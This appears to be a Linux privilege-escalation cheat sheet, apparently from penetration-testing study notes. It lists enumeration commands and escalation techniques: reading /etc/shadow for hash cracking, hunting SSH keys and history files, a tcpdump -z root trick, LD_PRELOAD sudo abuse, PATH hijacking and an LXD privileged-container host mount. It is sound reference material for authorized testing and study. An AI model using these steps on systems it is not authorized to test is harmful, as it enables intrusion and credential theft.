# Linux Privilege Escalation

## User & Process Enumeration

### User
cat /etc/shells # Available login shells
whoami # Get current user context 
id # what groups does the user belong to
sudo -l	# Can the user run anything as another user?
history	# Check the current user's bash history
ls -all ~/.ssh 	# Check for SSH keys for current user
echo $PATH # Check the current user's PATH variable contents
env # check environmental vars for the user, may find a password
lastlog # check user's last login time

### Other Users
ls -alh /home	# View user home directories. Check .bash_history & .ssh/ for keys
find / -type f \( -name *_hist -o -name *_history \) -exec ls -l {} \; 2>/dev/null # find history files
ps au # See logged in users
w # see logged in users
finger # see logged in users
cat /etc/passwd | cut -f1 -d: # get all users from /etc/passwd

### SEDUID & SETGID
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null	# Find binaries with the SUID bit set. The file will execute with the privileges of the file group.
find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null	# Find binaries with the SETGID bit set. The file will execute with the privilege of the file owner.

### Passwords & Hashes
cat /etc/passwd # file is readable by all users, sometimes a hash will be in here. If we have the shadow file, too, then we can crack the hashes
cat /etc/shadow # if readable, then hashes for all users will be available to crack
cat /etc/group # view groups
getent group sudo # get the members of ANY group, e.g. sudo

### Processes
ps au
ps aux | grep root	# See processes running as root
ps aux | grep $user # See processes running as $user
ls -la /etc/cron.daily # Check for daily Cron jobs
./pspy64 -pf -i 1000	# View running processes with pspy

### Services, Packages, & Binaries
sudo -V # Check sudo version to see if vulnerable to exploit
ls -l /bin /usr/bin/ /usr/sbin/ # View binaries
apt list --installed | tr "/" " " | cut -d" " -f1,3 | sed 's/[0-9]://g' | tee -a installed_pkgs.list # Create a list of installed packages
for i in $(curl -s https://gtfobins.github.io/ | html2text | cut -d" " -f1 | sed '/^[[:space:]]*$/d');do if grep -q "$i" installed_pkgs.list;then echo "Check GTFO for: $i";fi;done # Search GTFObins for installed package list created above
strace ping -c1 10.129.112.20 # track and analyze system calls and signal processing. It allows us to follow the flow of a program and understand how it accesses system resources, processes signals, and receives and sends data from the operating system

### Writable dirs & files
find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null	# Find world-writeable directories
find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null	# Find world-writeable files
find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null	# Search for config files
find / -type f \( -name *.conf -o -name *.config \) -exec ls -l {} \; 2>/dev/null # Get all readable config files
find / -type f -name ".*" -exec ls -l {} \; 2>/dev/null | grep username # All hidden files for $username
find / -type d -name ".*" -ls 2>/dev/null # All hidden directories
find / -type f -name "*.sh" 2>/dev/null | grep -v "src\|snap\|share" # Search for scripts

### Interesting dirs
ls -l /tmp /var/tmp /dev/shm # View temporary files
/tmp # Data stored for up to 10 days or upon device restart
/var/tmp # Data stored for up to 30 days

## System & Environment Enumeration

### OS Information
hostname
cat /etc/os-release # Check the OS version
cat /etc/lsb-release	# Check the OS version
uname -a	# Check the Kernel version
cat /proc/version # Check the Kernal version
lscpu # Check the CPU type/version
find /proc -name cmdline -exec cat {} \; 2>/dev/null | tr " " "\n" #  used to look up system information such as the state of running processes, kernel parameters, system memory, and devices. It also sets certain system parameters, such as process priority, scheduling, and memory allocation.


### Network Information
ip a # check subnets and NICs
ifconfig # check subnets and NICs
route # routing table
netstat -rn # routing table
arp -a # Check what other hosts the system has been communicating with
cat /etc/hosts # local DNS entries


### Mounted File Systems & Additional drives / peripherals
df -h # View mounted file systems. Root required to mount/unmount drives.
lsblk	# Check for unmounted file systems/drives. If you discover and can mount an additional drive or unmounted file system, you may find sensitive files, passwords, or backups that can be leveraged to escalate privileges.
cat /etc/fstab # search for 'password' 'username', 'credential' by grepping. Used for mounted drives
cat /etc/fstab | grep -v password # example
lpstat # Check for any attached printers for potential interesting info
cat /etc/fstab | grep -v "#" | column -t # View unmounted file systems

## Linux Privilege Escalation Techniques

gcc kernel_expoit.c -o kernel_expoit #	Compile an exploit written in C
screen -v	# Check the installed version of Screen
sudo /usr/sbin/tcpdump -ln -i ens192 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root	# Priv esc with tcpdump
PATH=.:${PATH}	# Add a . to the beginning of the current user's PATH
ldd /bin/ls	# View the shared objects required by a binary
sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart	# Escalate privileges using LD_PRELOAD
readelf -d payroll | grep PATH	# Check the RUNPATH of a binary
gcc src.c -fPIC -shared -o /development/libshared.so	# Compiled a shared libary
lxd init	# Start the LXD initialization process
lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine	# Import a local image
lxc init alpine r00t -c security.privileged=true	 # Start a privileged LXD container
lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true	# Mount the host file system in a container
lxc start r00t	# Start the container
showmount -e 10.129.2.12	# Show the NFS export list
sudo mount -t nfs 10.129.2.12:/tmp /mnt	# Mount an NFS share locally
tmux -S /shareds new -s debugsess	# Created a shared tmux session socket
./lynis audit system	# Perform a system audit with Lynis
